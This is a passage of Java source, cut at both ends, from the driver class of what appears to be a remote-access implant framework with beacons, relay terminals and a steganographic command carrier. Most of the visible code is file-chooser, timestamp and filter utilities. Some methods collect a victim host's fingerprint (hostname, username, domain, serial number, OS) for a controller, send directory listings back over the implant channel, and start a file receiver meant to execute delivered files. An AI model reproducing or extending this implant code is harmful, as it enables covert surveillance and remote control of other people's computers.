					else//no need to limit the results, simply add all files
					{
						alToReturn.add(fleFilePaths[i]);
					}
				}
			}// end for
			
			return alToReturn;
		}
		
		catch(Exception e)
		{
			Drivers.eop("getFilesUnderSelectedDirectory with acceptableExtensions array", "Driver", e, e.getMessage(), true);
		}
		
		return null;
	}
	
	
	
	
	/**
	 * This method queries the user via JChooser to select a file
	 */
	public static File querySelectFile(boolean openDialog, String dialogueTitle, int fileChooserSelectionMode, boolean thisLoadsCSV, boolean useFileFilter)
	{
		
		/**
		 * Drivers_Thread.fleCarrier_NetworkCommand = Drivers.querySelectFile(true, "Please Select the Carrier Image to hold the Steganographic command(s) and content", JFileChooser.FILES_ONLY, false, true);
			
			if(Drivers_Thread.fleCarrier_NetworkCommand == null)
			{
				this.jtfCarrierImage_Settings.setText("No Carrier Destination File Selected");
				this.jtfCarrierImage_Settings.setToolTipText("No Carrier Destination File Selected");
			}
			
			else//a good file was selected
			{
				this.jtfCarrierImage_Settings.setText(Drivers_Thread.fleCarrier_NetworkCommand.getCanonicalPath());
				jtfCarrierImage_Settings.setToolTipText(Drivers_Thread.fleCarrier_NetworkCommand.getCanonicalPath());
			}
		 */
		
		try
		{
			JFileChooser jfc = new JFileChooser(new File("."));
			jfc.setFileSelectionMode(fileChooserSelectionMode);
			jfc.setDialogTitle(dialogueTitle);
			//jfc.setMultiSelectionEnabled(enableMultipleFileSelection);
			
			if(thisLoadsCSV)
			{
				jfc.setFileFilter(new javax.swing.filechooser.FileFilter() 
				{
		            public boolean accept(File fle) 
		            {
		                //accept directories
		            	if(fle.isDirectory())
		                	return true;
		            	
		            	String strFleName = fle.getName().toLowerCase();
		                 
		                return strFleName.endsWith(".csv");
		              }
		   
		              public String getDescription() 
		              {
		                return "Comma Separated Values";
		              }
		              
		         });
				
			}
			
			/***************************************
			 * Filter for only Specified Formats
			 ***************************************/
			else if(useFileFilter)
			{
				jfc.setFileFilter(new javax.swing.filechooser.FileFilter() 
				{
		            public boolean accept(File fle) 
		            {
		            	String extension = "";
		            	
		                //accept directories
		            	if(fle.isDirectory())
		                	return true;
		            	
		            	if(fle == null)
		            		return false;
		            	
		            	if(fle != null && fle.exists() && Driver.getFileExtension(fle, false)!= null)
		            		extension = (Driver.getFileExtension(fle, false)).replace(".", "");//remove the "." if present
		            	
		            	/*if(Driver.lstAcceptableFileExtensionsForStego.contains(extension.toLowerCase()))
		            		return true;*/
		            	
		            	//else 
		            		return false;
		              }
		   
		              public String getDescription() 
		              {
		                return "Specific Formats";
		              }
		              
		         });
			}
			
			
			try
			{
				jfc.setCurrentDirectory(new File(".\\"));
			}catch(Exception e){}
			
			int selection = 0;
			
			if(openDialog)					
			{
				selection = jfc.showOpenDialog(null);
			}
			
			else
			{
				//selection = jfc.showDialog(null, "Save Now!"); <-- this code works too
				selection = jfc.showSaveDialog(null);
			}
					
			if(selection == JFileChooser.APPROVE_OPTION)//selected yes!
			{
				if(openDialog || (!openDialog && !thisLoadsCSV))
					return jfc.getSelectedFile();
				
				else
					return new File(jfc.getSelectedFile().getAbsolutePath() + ".csv");
			}
			
			//else fall through and return null;
		}
		
		catch(Exception e)
		{
			Drivers.eop("querySelectFile", "Driver", e, e.getMessage(), false);
		}
		
		return null;
	}
	
	public static Thread_Terminal getBeaconThread(String confirmationID)
	{
		try
		{
			if(confirmationID == null || confirmationID.trim().equals(""))
			{
				return null;
			}
			
			Thread_Terminal beacon = null;
			
			//otherwise, search for the thread if we still have it
			for(int i = 0; i < Driver.alBeaconTerminals.size(); i++)
			{
				beacon = Driver.alBeaconTerminals.get(i);
				
				if(confirmationID.trim().equalsIgnoreCase(beacon.myReceivedConfirmationID_From_Implant))
				{
					//found it, return the beacon
					return beacon;
					
					
				}
				
				
			}
			
			//otherwise, return null below
			
		}
		catch(Exception e)
		{
			Driver.eop("getBeaconThread", strMyClassName, e, "", false);
		}
		
		return null;
	}
	
	public static String getFileExtension(File fle, boolean removeDot_Preceeding_Extension)
	{
		try
		{
			if(fle != null)
			{
				if(removeDot_Preceeding_Extension)
					return (fle.toString().substring(fle.toString().lastIndexOf(".") + 1));
					
				//some files do not have extensions, in such cases, SNSCat may seem to be crashing. therefore check if the file contains a "." at the end, if not, return what we have
				if(!fle.toString().contains(".") || fle.toString().lastIndexOf(".") < 0 )
				{
					try
					{
						return (fle.toString().substring(fle.toString().lastIndexOf(System.getProperty("file.separator"))));
					}
					catch(Exception e)
					{
						return " ";
					}
				}
				
				return (fle.toString().substring(fle.toString().lastIndexOf(".")));
			}
			
		}
		catch(NullPointerException npe)
		{
			Drivers.sop("NullPointerException caught in getFileExtension_ByteArray mtd in Drivers.  This seems to be a sporadic error, called when user first attempts to view the files in a directory. This does not affect funtionality of program.  Dismissing error...");
		}
		catch(Exception e)
		{
			Drivers.eop("getFileExtension", "Driver", e, "Possibly null file passed in", true);
		}
		
		return null;
	}
	
	/**
	 * This method queries the user via JChooser to select a file
	 */
	public static File [] querySelectMultipleFile(boolean openDialog, String dialogueTitle, int fileChooserSelectionMode, boolean thisLoadsCSV, boolean useFileFilter)
	{
		try
		{
			JFileChooser jfc = new JFileChooser(new File("."));
			jfc.setFileSelectionMode(fileChooserSelectionMode);
			jfc.setDialogTitle(dialogueTitle);
			jfc.setMultiSelectionEnabled(true);
			
			if(thisLoadsCSV)
			{
				jfc.setFileFilter(new javax.swing.filechooser.FileFilter() 
				{
		            public boolean accept(File fle) 
		            {
		                //accept directories
		            	if(fle.isDirectory())
		                	return true;
		            	
		            	String strFleName = fle.getName().toLowerCase();
		                 
		                return strFleName.endsWith(".csv");
		              }
		   
		              public String getDescription() 
		              {
		                return "Comma Separated Values";
		              }
		              
		         });
				
			}
			
			else if(useFileFilter)
			{
				jfc.setFileFilter(new javax.swing.filechooser.FileFilter() 
				{
		            public boolean accept(File fle) 
		            {
		            	String extension = "";
		            	
		                //accept directories
		            	if(fle.isDirectory())
		                	return true;
		            	
		            	if(fle == null)
		            		return false;
		            	
		            	if(fle != null && fle.exists() && Driver.getFileExtension(fle, false)!= null)
		            		extension = (Driver.getFileExtension(fle, false)).replace(".", "");//remove the "." if present
		            	
		            	/*if(Drivers.lstAcceptableFileExtensionsForStego.contains(extension.toLowerCase()))
		            		return true;
		            	*/
		            	
		            	
		            	//else 
		            		return false;
		              }
		   
		              public String getDescription() 
		              {
		                return "Multiple Formats";
		              }
		              
		         });
			}
			
			
			try
			{
				jfc.setCurrentDirectory(new File(".\\"));
			}catch(Exception e){}
			
			int selection = 0;
			
			if(openDialog)					
			{
				selection = jfc.showOpenDialog(null);
			}
			
			else
			{
				selection = jfc.showSaveDialog(null);
			}
					
			if(selection == JFileChooser.APPROVE_OPTION)//selected yes!
			{
				if(openDialog || (!openDialog && !thisLoadsCSV))
					return jfc.getSelectedFiles();//solo, come here!
				
				/*else
					return new File(jfc.getSelectedFile().getAbsolutePath() + ".csv");*/
			}
			
			//else fall through and return null;
		}
		
		catch(Exception e)
		{
			Drivers.eop("querySelectFile", "Driver", e, e.getMessage(), true);
		}
		
		return null;
	}
	
	
	
	/**
	 * This method is called from querySelectFile.  You see, if the user is able to select multiple files, 
	 * querySelectFile was written to return only one file.  Therefore, this method, if the user is allowed to return multiple files will actually handle returning the file array based on the user selecting ok
	 * 
	 * @param jfcToReturn
	 * @return
	 */
	private File [] returnSelectedFiles(JFileChooser jfcToReturn)
	{		
		try
		{
			return jfcToReturn.getSelectedFiles();			
		}
		catch(Exception e)
		{
			Drivers.eop("returnSelectedFiles", strMyClassName, e, e.getLocalizedMessage(), true);
		}
		
		return null;
	}
	
	public static boolean writeFile(File flePathToWrite, LinkedList<String> llDataToWrite)
	{
		try
		{
			if(flePathToWrite == null  || !flePathToWrite.exists())
			{
				Driver.sop("file path to write is invalid!");
				return false;
			}
			
			if(llDataToWrite == null || llDataToWrite.size() < 1)
			{
				Driver.sop("data to write out to file is empty! unable to continue");
				return false;
			}
			
			//
			//otherwise, attempt to write out to file
			//
			PrintWriter pwHostOut = new PrintWriter(new FileWriter(flePathToWrite, false));			 
			
			for(int i = 0; i < llDataToWrite.size(); i++)
			{
				pwHostOut.println(llDataToWrite.get(i));
				pwHostOut.flush();
			}
			
			try
			{
				pwHostOut.flush();
			}catch(Exception e){}
			
			pwHostOut.close();			
			
			return true;
		}
		catch(Exception e)
		{
			Driver.sop("UNABLE TO SAVE TO FILE. PERHAPS FILE IS WRITE PROTECTED...?");
		}
		
		return false;
	}
	
	/**
	 * This method just returns the current system clock time in the format HH:MM "SS
	 */
	public static String getTimeStamp_Without_Date()
	{
		Date dateTime;// = new Date();//get the current date, time, timezone  //  @jve:decl-index=0:

		String timeToSplit = "";
		String dateTime_To_Display = "";  //  @jve:decl-index=0:
		String [] arrSplitTime;
		String [] arrSplitHour;
		String strHourMin = "";
		
		dateTime = new Date();
		
		try
		{	
			timeToSplit = dateTime.toString();
						
			arrSplitTime = timeToSplit.split(" ");//return an array with Day_Name Mon Day_Num HH:MM:SS LocalTime YYYY
						
			if(arrSplitTime.length != 6)//ensure array was split properly; if it's length is not 6, then an error occurred, so just show the simple time by throwing the exception
				throw new Exception();
			
			arrSplitHour = (arrSplitTime[3]).split(":");
			
			if(arrSplitHour.length != 3)//again, ensure we split the time from 18:57:48 bcs we only want 18:57
				throw new Exception();
			
			return strHourMin = arrSplitHour[0] + ":" + arrSplitHour[1] + " \"" + arrSplitHour[2];  
			
			
		}//end try
		catch(Exception e)//incase an error is generated from the above parse of the time and date, simply display the generic date for the client
		{
			dateTime_To_Display = "Time: " + dateTime.toString();
		}
		
		return dateTime_To_Display;		
	}//end mtd getTimeStamp
	
	
	
	
	public static boolean removeThread(Splinter_IMPLANT threadToRemove, long threadID_ToRemove)
	{
		try
		{
			if(Driver.alImplant == null || Driver.alImplant.size() < 1)
			{
				sop("ArrayList is empty. No clients further to remove");
				numConnectedImplants = 0;
				return false;
			}
			
			//remove thread from Active Implant's list
			if(Driver.alImplant.contains(threadToRemove))
			{
				Driver.alImplant.remove(threadToRemove);	
				numConnectedImplants = Driver.alImplant.size();
			}
			
			Driver.sop("Thread ID: [" + threadID_ToRemove + "] has been removed." + "# Threads remaining: " + Driver.alImplant.size());
			
			return true;
		}
		catch(Exception e)
		{
			sop("Exception handled when removing thread id: " + threadID_ToRemove);
		}
		
		return false;
	}
	
	public static long getTime_Current_Millis()	{	try	{	return System.currentTimeMillis();	}	catch(Exception e){} return 1;}
	
	/**
	 * This method returns the current time stamp for this system's time clock in the format: Sat - 12 Jul 2008 - 15:48 "13 - Eastern
	 */
	public static String getTimeStamp_Updated()
	{
		
		Date dateTime;// = new Date();//get the current date, time, timezone  //  @jve:decl-index=0:
		String timeToSplit = "";
		String [] arrSplitTime;
		SimpleDateFormat dateFormat = new SimpleDateFormat("EE - dd MMM yyyy - HH:mm \"ss - zzzz");
		String [] arrSplitTimeZone;
		String dateTime_To_Display = "";  //  @jve:decl-index=0:
		//Get the Date
		dateTime = new Date();//must always re-init in order to get the curr date and time
		

		
		try
		{	

			//Get the formatted string from the date: in form of "Wed - 01 Oct 08 - 00:36 "28 - Central Daylight Time"
			timeToSplit = dateFormat.format(dateTime);
			
			arrSplitTime = timeToSplit.split("-");//return an array delimeted with Day of the Week, Date, Time, Time Zone
			
			//Note: we don't to display the entire time zone text, i.e. if time zone is Central Daylight Time, we only want Central to show, therefore split the last token in arrSplitTime and return only the first word
			arrSplitTimeZone = (arrSplitTime[3]).split(" ");

			//		 DAY OF WEEK		-	   DAY MON YEAR			 -		TIME		   -		TIME ZONE		
			return (arrSplitTime[0] + " - " + arrSplitTime[1] + " - " + arrSplitTime[2] + "- " + arrSplitTimeZone[1] + "         ");
			
			
		}//end try
		catch(Exception e)//incase an error is generated from the above parse of the time and date, simply display the generic date for the client
		{
			//go to the old way for calling the Rime:
			try
			{
				return getTimeStamp_Without_Date();
			}
			catch(Exception ee)
			{
				//all else failed, just return the time
				return dateTime_To_Display = "Time: " + dateTime.toString();
			}
			
		}
		
		//return dateTime_To_Display;		
	}
	
	public static String getTime_Specified_Hyphenated(long time_millis)
	{
		try
		{
			DateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd-HHmm");
			dateFormat.setLenient(false);
			
			Date dateTime = new Date(time_millis);
			
			return dateFormat.format(dateTime);
		}
		catch(Exception e)
		{
			Drivers.sop("Invalid date specified - -" + " it does not a proper date was selected");
			//Drivers.eop("Drivers", "getTime_Specified_Millis", "", e, false);
		}
		
		return "";
	}
	
	/**
	 * This method calculates the time difference between the string time passed in (in milliseconds) and the current system time
	 */
	public static String getTimeInterval(long currTime_millis, long prevTime_millis)
	{
		String timeInterval = "UNKNOWN";
		try
		{
			SimpleDateFormat dateFormat = new SimpleDateFormat("HH:mm:ss");
			dateFormat.setTimeZone(TimeZone.getTimeZone("GMT"));
			
			//long currTime_millis = System.currentTimeMillis();//get the current time in milliseconds
			
			long interval = currTime_millis - prevTime_millis;
			
			timeInterval = dateFormat.format(new Date(interval));		
			
		}
		catch(Exception e)
		{
			System.out.println("Error caught in calculateTimeInterval_From_Present_Time mtd");
		}
		
		return timeInterval;
	}
	
	public static String getTimeInterval_WithDays(long currTime_millis, long prevTime_millis)
	{
		String timeInterval = "UNKNOWN";
		try
		{
			SimpleDateFormat dateFormat = new SimpleDateFormat("DD:HH:mm:ss");
			dateFormat.setTimeZone(TimeZone.getTimeZone("GMT"));
			
			//long currTime_millis = System.currentTimeMillis();//get the current time in milliseconds
			
			long interval = currTime_millis - prevTime_millis;
			
			timeInterval = dateFormat.format(new Date(interval));		
			
		}
		catch(Exception e)
		{
			System.out.println("Error caught in calculateTimeInterval_From_Present_Time mtd");
		}
		
		return timeInterval;
	}
	
	
	/**
	 * This method calculates the next time an event will be fired off from the passed in time (in milliseconds).
	 * Therefore, the future time an event will be fired can be calculated here by passing in the last time an event was fired (in milliseconds) and the delay time between actionEvent firings.
	 * Adding these together and converting back to normal Date time, will give us the future time to expect an event to fire an event again 
	 * 
	 */
	public static String getTime_calculateFutureTime_Given_Time_And_Delay(long prevTime_millis, long delay)
	{
		String futureTime = "UNKNOWN";
		try
		{
			SimpleDateFormat dateFormat = new SimpleDateFormat("HH:mm:ss");
			dateFormat.setTimeZone(TimeZone.getTimeZone("GMT-4:00"));//should be -5:00, but for some reason (perhaps DST, the time returned is 1 hour behind the actual
									
			long interval = prevTime_millis + delay;
			
			futureTime = dateFormat.format(new Date(interval));		
		}
		catch(Exception e)
		{
			System.out.println("Error caught in calculateFutureTime_From_Given_Time_And_Delay mtd");
		}
		
		return futureTime;
	}
	
	/**
	 * This method returns the system time in the format HH:mm:ss
	 */
	/*public String getSystemTime()
	{
		try
		{
			//get the current sys time
			return dateFormatSysTime.format(new Date(System.currentTimeMillis()));
		}
		catch(Exception e)
		{
			//if that fails, all the method we konw works
			return getTimeStamp_Without_Date();
		}
	}*/
	
	public static boolean sendToImplant(Splinter_IMPLANT implant_ok_to_be_null, String strToSend)
	{
		try
		{
			if(implant_ok_to_be_null != null)
			{
				
				implant_ok_to_be_null.sendToController("Specified Directory to list does not exist" + strToSend, false, false);
			}
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("sendToImplant", "Driver", e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
	public static boolean fileMatchesFilter(File fle, String filter)
	{
		try
		{
			boolean filterMatch = false;
			boolean fileNameMatch = false;
			
			if(fle == null || !fle.exists() || filter == null)
			{
				return false;
			}
			
			filter = filter.toLowerCase().trim();
			
			if(!filter.contains("."))
			{
				filter = "*.*";
			}
			
			if(filter.startsWith("."))
			{
				filter = "*." + filter;
			}
			
			//PUNT OUT IF WE WANT TO SIMPLY TAKE EVERYTHING NO MATTER WHAT
			if(filter.trim().equalsIgnoreCase("*.*"))
			{
				return true;
			}
			
			//String fullPath = fle.getCanonicalPath();
			String fullPath = fle.getName();
			
			int lastIndex_FileName = fullPath.lastIndexOf(".");
			
			int lastIndex_Filter = filter.lastIndexOf(".");
			
			if(lastIndex_FileName < 1 || lastIndex_Filter < 1)
			{
				return false;
			}
			
			//String FileName_Header_Without_Extension =  fullPath.substring(fullPath.lastIndexOf(Driver.fileSeperator),lastIndex_FileName);
			String FileName_Header_Without_Extension = fullPath.substring(0,lastIndex_FileName);
			String FileExtension = fullPath.substring(lastIndex_FileName);
			
			String Filter_Header =  filter.substring(0,lastIndex_Filter);
			String FilterExtension = filter.substring(lastIndex_Filter);
			
			/*if(FileName_Header_Without_Extension.trim().startsWith(Driver.fileSeperator))
			{
				FileName_Header_Without_Extension = FileName_Header_Without_Extension.substring(1);
			}*/
			
						
			//NORMALIZE: -->trim results
			FileName_Header_Without_Extension = FileName_Header_Without_Extension.trim();
			Filter_Header = Filter_Header.trim();
			FileExtension = FileExtension.trim();
			FilterExtension = FilterExtension.trim();
			
			//GET RID OF leading period if present in the extensions
			if(FileExtension.startsWith("."))
			{
				FileExtension = FileExtension.substring(1);
			}
			
			if(FilterExtension.startsWith("."))
			{
				FilterExtension = FilterExtension.substring(1);
			}
			
			
			//Driver.sop("\nFileHeader: \"" + FileName_Header_Without_Extension + "\" Extension: \"" + FileExtension + "\" FilterHeader: \"" + Filter_Header + "\" FilterExtension: \"" + FilterExtension + "\"\n");
			
			//ok, so at this point, we have the file name, extension, and filter separated into its atomic components, test if we're adding the file
			
			/************************************************************************************
			 * CHECK IF EXTENSION MATCHES
			 ************************************************************************************/
			/*//*
			if(FilterExtension.equalsIgnoreCase("*"))
			{
				filterMatch = true;
			}
			
			//*doc
			else if(FilterExtension.startsWith("*"))
			{
				FilterExtension = FilterExtension.substring(1);//remove the leading *
				
				if(FileExtension.endsWith(FilterExtension))
				{
					filterMatch = true;
				}								
			}
			
			//doc*
			else if(FilterExtension.endsWith("*"))
			{
				FilterExtension = FilterExtension.substring(0, FilterExtension.length()-2);//remove the trailing *
				
				if(FileExtension.startsWith(FilterExtension))
				{
					filterMatch = true;
				}								
			}
			
			//*doc*
			else if(FilterExtension.startsWith("*") && FilterExtension.endsWith("*"))
			{
				FilterExtension = FilterExtension.substring(1, FilterExtension.length()-2);//remove the leading and trailing *
				
				if(FileExtension.contains(FilterExtension))
				{
					filterMatch = true;
				}								
			}
			
			//doc
			else if(FileExtension.equalsIgnoreCase(FilterExtension))
			{
				filterMatch = true;
			}								
			*/
			
			filterMatch = checkNameAgainstFilter(FileExtension, FilterExtension);
			fileNameMatch = checkNameAgainstFilter(FileName_Header_Without_Extension, Filter_Header);
			
			if(filterMatch && fileNameMatch)
			{
				return true;
			}
						
		}
		catch(Exception e)
		{
			Driver.eop("fileMatchesFilter", "Driver", e, e.getLocalizedMessage(), false);
		}
		
		return false;
		
	}
	
	public static boolean checkNameAgainstFilter(String name, String filter)
	{
		//Driver.sop("Filter: \"" + filter + "\"  name: \"" + name + "\"\n" );
		
		try
		{
			name = name.toLowerCase().trim();
			filter = filter.toLowerCase().trim();
			
			//*
			if(filter.equalsIgnoreCase("*"))
			{
				return true;
			}
			
			//*doc*
			else if(filter.startsWith("*") && filter.endsWith("*"))
			{				
				//filter = filter.substring(1, filter.length()-2);//remove the leading and trailing *
				filter = filter.replace("*", "");//remove the leading and trailing *					
				
				//if(name.contains(filter))
				//if(name.matches(filter))
				if(name.indexOf(filter) != -1)
				{
					return true;
				}								
			}
			
			//*doc
			else if(filter.startsWith("*"))
			{
				filter = filter.substring(1);//remove the leading *
				
				if(name.endsWith(filter))
				{
					return true;
				}								
			}
			
			//doc*
			else if(filter.endsWith("*"))
			{
				filter = filter.substring(0, filter.length()-2);//remove the trailing *
				
				if(name.startsWith(filter))
				{
					return true;
				}								
			}
			
			//doc
			else if(name.equalsIgnoreCase(filter))
			{
				return true;
			}	
			
		}
		catch(Exception e)
		{
			Driver.eop("checkNameAgainstFilter", "Driver", e, e.getLocalizedMessage(), false);
		}
		
		return false;
	}
	
	public static ArrayList<File> listFilesUnderDirectory(File topFolderToList, String filter_ok_to_be_null, boolean recursively_Search_And_Include_AllSubDirectories_As_Well, ArrayList<File> alToPopulate_ok_to_be_null, Splinter_IMPLANT implant_ok_to_be_null)
	{
		try
		{
			if(alToPopulate_ok_to_be_null == null)
			{
				alToPopulate_ok_to_be_null = new ArrayList<File>();
			}
			
			if(filter_ok_to_be_null == null || filter_ok_to_be_null.trim().equals(""))
			{
				filter_ok_to_be_null = "*.*";//specify to take all files!
			}
			
			/******************************************************************************
			 * ENSURE DIRECTORY EXISTS
			 ******************************************************************************/
			if(topFolderToList == null || !topFolderToList.exists())
			{
				String path = "";
				
				if(topFolderToList != null)
				{
					try{path = ": \"" + topFolderToList.toString() + "\"";}catch(Exception ff){}
				}
					
				//SEND ALERT TO CONTROLLER
				Driver.sendToImplant(implant_ok_to_be_null, "Specified Directory to list does not exist" + path);				
				
				//return the arraylist vice null... bcs, what if the directory is deleted while we were in the process of updating, at least return our current results
				Driver.sop("* * * ERROR!!!  Directory" + path + " does not exist to list!!! ");				
				
				return alToPopulate_ok_to_be_null;
			}
			
			/******************************************************************************
			 * BASE CASE!!!!! ENSURE DIRECTORY IS A DIRECTORY
			 ******************************************************************************/
			
			//else, determine if we have a file or a folder to delete
			if(topFolderToList.isFile())
			{
				if(!alToPopulate_ok_to_be_null.contains(topFolderToList))
				{
					//only add if it meets the filter
					if(filter_ok_to_be_null == null || filter_ok_to_be_null.trim().equalsIgnoreCase("*.*") || Driver.fileMatchesFilter(topFolderToList, filter_ok_to_be_null))
					{
						alToPopulate_ok_to_be_null.add(topFolderToList);
					}
				}
				
				return alToPopulate_ok_to_be_null;
			}
			
			
			/******************************************************************************
			 * WE KNOW WE HAVE A DIRECTORY [OR DRIVE] LIST THE CONTENTS
			 ******************************************************************************/
			
			File [] arrFilesUnderPath =  null;
			
			try
			{
				//First, get blanket listing of all files including directory paths
				arrFilesUnderPath = topFolderToList.listFiles();
			}
			catch(Exception ee)
			{
				Driver.sop("Could not list files under directory " + topFolderToList + " Perhaps access was denied, location is not a directory, or does not exist");
				Driver.sendToImplant(implant_ok_to_be_null, "Could not list files under directory " + topFolderToList + " Perhaps access was denied, location is not a directory, or does not exist");
				return alToPopulate_ok_to_be_null;
			}
			
			/******************************************************************************
			 * ENSURE WE HAVE AT LEAST ONE OR MORE PATHS TO LIST
			 ******************************************************************************/
			if(arrFilesUnderPath == null || arrFilesUnderPath.length < 1)
			{
				//we got nothing in this listing, return what we have thus far
				return alToPopulate_ok_to_be_null;
			}
			
			/******************************************************************************
			 * WE HAVE AT LEAST ONE PATH, IF IT'S A FILE, ADD IT. IF IT'S A DIRECTORY
			 * AND RECURSIVE DIRECTORY IS SELECTED, TRAVERSE TO LIST CONTENTS OF THE 
			 * DIRECTORY
			 ******************************************************************************/	
			File fle = null;
			
			for(int i = 0; i < arrFilesUnderPath.length; i++)
			{
				fle = arrFilesUnderPath[i];
				
				//add if it's a valid file
				if(fle != null && fle.exists() && fle.isFile() && !alToPopulate_ok_to_be_null.contains(fle))
				{
					//only add if file meets the filter
					if(filter_ok_to_be_null == null || filter_ok_to_be_null.trim().equalsIgnoreCase("*.*") || Driver.fileMatchesFilter(fle, filter_ok_to_be_null))
					{					
						alToPopulate_ok_to_be_null.add(fle);
					}
					continue;
				}
				else if(fle != null && fle.exists() && fle.isDirectory())
				{
					
					/******************************************************************************
					 * RECURSIVE CALL
					 ******************************************************************************/
					//directory found, determine if we're recursing to list this directory
					if(recursively_Search_And_Include_AllSubDirectories_As_Well)
					{
						//note, in this recursive call, we perform call Driver.listFilesUnderDirectory(params) vice return Driver.listFilesUnderDirectory(params) bcs there is other stuff we want to do 
						//still in this mtd.  if this was the very last thing to do in the mtd, then a return Driver.listFilesUnderDirectory(params) would be appropriate, however, since there are still
						//elements in this loop we want to do, only call the recursive mtd, and continue when it returns
						
						Driver.listFilesUnderDirectory(fle, filter_ok_to_be_null, recursively_Search_And_Include_AllSubDirectories_As_Well, alToPopulate_ok_to_be_null, implant_ok_to_be_null);
						continue;
					}
					
					else//don't recurse this directory and do not add it to the arraylist
					{
						continue;
					}
				}
			}
				
			
			return alToPopulate_ok_to_be_null;
		}
		catch(Exception e)
		{
			Driver.eop("listFilesUnderDirectory", "Driver", e, e.getLocalizedMessage(), false);
		}
		
		return alToPopulate_ok_to_be_null;
	}
	
	public static boolean removeThread(Thread_Terminal threadToRemove, long threadID_ToRemove)
	{
		try
		{
			if(Driver.alRelayTerminals == null || Driver.alRelayTerminals.size() < 1)
			{
				sop("ArrayList is empty. No clients further to remove");
				return false;
			}
			
			//remove thread from Active Implant's list
			if(Driver.alRelayTerminals.contains(threadToRemove))
			{
				boolean removalSuccess = Driver.alRelayTerminals.remove(threadToRemove);
				threadToRemove.I_am_Disconnected_From_Implant = true;//ensure it knows it's disconnected
				
				if(removalSuccess)
				{
					Driver.sop("Successfully removed thread ID: " + threadID_ToRemove);
				}
			}
			
			Drivers.sop("Remaining Relay Threads: " + Driver.alRelayTerminals.size());
			
			//update connected agents
			RelayBot_ServerSocket.updateConnectedImplants();				
			
			return true;
		}
		catch(Exception e)
		{
			sop("Exception handled when removing thread id: " + threadID_ToRemove + " in class: " + "Driver");
		}
		
		//update connected agents
		RelayBot_ServerSocket.updateConnectedImplants();
		
		return false;
	}
	
	public static int jop_Confirm(String strText, String strTitle)
	{
		try
		{
			return JOptionPane.showConfirmDialog(null, strText, strTitle, JOptionPane.YES_NO_OPTION, JOptionPane.QUESTION_MESSAGE);
		}
		catch(Exception e)
		{
			//Drivers.eop("queryDialog", strMyClassName, e, e.getMessage(), true);
		}
		
		return -1;
	}
	
	public static void jop_Error(String strMsg, String strTitle)
	{
		JOptionPane.showMessageDialog(null, strMsg, strTitle, JOptionPane.ERROR_MESSAGE);
	}
	
	public static void jop_Warning(String strMsg, String strTitle)
	{
		JOptionPane.showMessageDialog(null, strMsg, strTitle, JOptionPane.WARNING_MESSAGE);
	}
	
	public static void jop_Message(String strMsg, String strTitle)
	{
		JOptionPane.showMessageDialog(null, strMsg, strTitle, JOptionPane.INFORMATION_MESSAGE);
	}
	
	public static void jop(String strMsg)
	{
		JOptionPane.showMessageDialog(null, strMsg, "Message", JOptionPane.INFORMATION_MESSAGE);
	}
	public static void jop_Message(String strMsg)
	{
		JOptionPane.showMessageDialog(null, strMsg, "Message", JOptionPane.INFORMATION_MESSAGE);
	}
	
	public static String getHandshakeData(String delimeter)
	{
		try
		{
			if(Driver.myHandShake == null || Driver.myHandShake.trim().equals(""))
			{
				MapSystemProperties systemMap = new MapSystemProperties(false);
				
				myHandShake = systemMap.strLaunchPath + delimeter + systemMap.strHOSTNAME + delimeter + systemMap.strOS_Name + delimeter + systemMap.strOS_Type + delimeter + systemMap.strUserName + delimeter + systemMap.strUSERDOMAIN + delimeter + systemMap.strTEMP + delimeter + systemMap.strUSERPROFILE + delimeter + systemMap.strPROCESSOR_IDENTIFIER + delimeter + systemMap.strNUMBER_OF_PROCESSORS + delimeter + systemMap.strSystemRoot + delimeter + systemMap.strServicePack + delimeter + systemMap.strNumUsers + delimeter + systemMap.strSerialNumber + delimeter + systemMap.strPROCESSOR_ARCHITECTURE + delimeter + systemMap.strCountryCode + delimeter + systemMap.strOsVersion + delimeter + systemMap.strHOMEDRIVE; 
				
				try
				{
					if(systemMap.strLaunchPath == null || systemMap.strLaunchPath.trim().equals(""))
					{
						CURRENT_WORKING_DIRECTORY = "." + Driver.fileSeperator;
					}
					else
					{
						if(systemMap.strLaunchDirectory.endsWith(Driver.fileSeperator))
							CURRENT_WORKING_DIRECTORY = systemMap.strLaunchDirectory;
						else
							CURRENT_WORKING_DIRECTORY = systemMap.strLaunchDirectory + Driver.fileSeperator;
					}
					
					
					
				}catch(Exception e){CURRENT_WORKING_DIRECTORY = "." + Driver.fileSeperator;}
				
				fleCurrentWorkingDirectory = new File(CURRENT_WORKING_DIRECTORY);
				
				//return already populated handshake
				return myHandShake;
			}
			
			else//return already populated handshake
			{
				return myHandShake;
			}
		}
		catch(Exception e)
		{
			Driver.eop("getHandshakeData", "Driver", e, e.getLocalizedMessage(), false);
		}
		
		return "";
	}	
	
	
	public static String getBase64EncodedText_From_ByteArray(byte[]arrToEncode)
	{
		try
		{
			//convert the byte array of the digest into a base64 encoded string
			String base64_Hash = new String(Base64.encode(arrToEncode));
			
			return base64_Hash;
			
		}
		catch(Exception e)
		{
			Driver.eop("getBase64EncodedText_From_ByteArray", "Drivers", e, "", false);
		}
		
		return null;
	}
	
	/**
	 * This is done because there are multiple entries into this subroutine.  Never duplicate a function because you may enter
	 * consistency problems if both are implemented slightly differently for the exact feature in this program. 
	 * Instead move the subroutine at a higher tree such that all classes can call the same function
	 * 
	 * null is acceptable
	 * 
	 * @param cmd
	 * @return
	 */
	public static boolean initialize_file_receiver(String[] cmd, Splinter_IMPLANT par_SPLINTER, Thread_Terminal par_CONTROLLER)
	{
		try
		{
			//parent.sendCommand_RAW(""+this.getId() + " " + Driver.delimiter_FILE_MIGRATION + fleToTx.getCanonicalPath() + " " + Driver.delimiter_FILE_MIGRATION + " " + saveFleName + Driver.delimiter_FILE_MIGRATION + " " + argsv + Driver.delimiter_FILE_MIGRATION + " " + saveDirectory_on_Target + Driver.delimiter_FILE_MIGRATION + " " + full_execution_cmd + Driver.delimiter_FILE_MIGRATION + " " + execute_file_when_complete);
			String[] arguments = cmd[2].split(Driver.delimiter_FILE_MIGRATION);
			LinkedList<File_Receiver> list_to_use = null;
			
			//initialize list of receiver threads
			try
			{
				if(par_SPLINTER != null && par_SPLINTER.list_file_receivers == null)
				{
					par_SPLINTER.list_file_receivers = new LinkedList<File_Receiver>();
				}
			}catch(Exception e){}
			
			try
			{
				if(par_CONTROLLER != null && par_CONTROLLER.list_file_receivers == null)
				{
					par_CONTROLLER.list_file_receivers = new LinkedList<File_Receiver>();
				}
